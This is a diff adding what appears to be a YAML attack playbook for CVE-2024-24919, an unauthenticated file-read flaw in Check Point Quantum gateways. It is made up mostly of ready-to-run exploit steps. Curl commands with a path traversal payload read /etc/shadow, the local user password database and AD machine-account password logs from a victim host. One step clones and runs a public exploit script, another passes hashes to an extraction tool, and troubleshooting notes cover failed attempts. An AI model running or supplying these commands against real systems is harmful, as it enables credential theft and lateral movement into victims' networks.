@@ -1,0 +1,71 @@
+chain_id: checkpoint_cve_2024_24919
+title: "Check Point Quantum Gateway — CVE-2024-24919 unauthenticated arbitrary file read"
+severity: CRITICAL
+tags: [checkpoint, quantum, vpn, cve-2024-24919, file-read, unauth, appliance]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-24919" }
+    - { banner_pattern: "(?i)check ?point|cphttpd" }
+    - { product_pattern: "(?i)check ?point" }
+    - { path_pattern: "(?i)/clients/MyCRL" }
+
+description: |
+  Check Point Security Gateway / CloudGuard / Quantum Spark with
+  the Mobile Access or Remote Access blade enabled. A path
+  traversal in the `/clients/MyCRL` POST handler lets an
+  unauthenticated attacker read any file the gateway process can
+  open — including the local user database, ssh keys, and the
+  Active Directory machine account password used by IPSec
+  remote-access. Exploited in the wild from May 28 2024.
+
+steps:
+  - id: 1
+    title: "Confirm the Mobile Access portal is exposed"
+    command: |
+      curl -sk -I "https://$VICTIMA/sslvpn/" | head -5
+      curl -sk -I "https://$VICTIMA/clients/MyCRL" | head -3
+
+  - id: 2
+    title: "Read /etc/shadow via the traversal"
+    command: |
+      curl -sk "https://$VICTIMA/clients/MyCRL" \
+        -H 'Content-Type: application/x-www-form-urlencoded' \
+        --data-binary 'aCSHELL/../../../../../../../etc/shadow' | tail -40
+
+  - id: 3
+    title: "Pull the local Check Point user/password DB"
+    command: |
+      curl -sk "https://$VICTIMA/clients/MyCRL" \
+        --data-binary 'aCSHELL/../../../../../../../config/db/initial' \
+        | tee /tmp/cp_db.txt | head -40
+      # Hashes are bcrypt-style; feed them to extractor:
+      rootctl extract /tmp/cp_db.txt
+
+  - id: 4
+    title: "Pull the AD machine password (lateral movement gold)"
+    command: |
+      curl -sk "https://$VICTIMA/clients/MyCRL" \
+        --data-binary 'aCSHELL/../../../../../../../var/log/CPmds-*/cpsdwan.elg' \
+        | grep -i 'machine\\|password' | head -20
+
+  - id: 5
+    title: "Public PoC if you want batched extraction"
+    command: |
+      git clone https://github.com/sromanhu/CVE-2024-24919-Check-Point-Exploit /tmp/cp24919
+      python3 /tmp/cp24919/exploit.py -u https://$VICTIMA -f /etc/shadow
+
+common_errors:
+  - error: "endpoint returns 404"
+    solution: |
+      Mobile Access / Remote Access blade not enabled, or you are
+      hitting management UI on 4434 instead of the gateway. Try
+      both 443 and 4434, and also `https://$VICTIMA/sslvpn/`.
+  - error: "200 OK but body is empty"
+    solution: |
+      Patched (R80.20.x hotfix from May 28 / R81.10 jumbo HF take 65+).
+      The handler still answers but strips traversal sequences.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-24919
+  - https://support.checkpoint.com/results/sk/sk182336
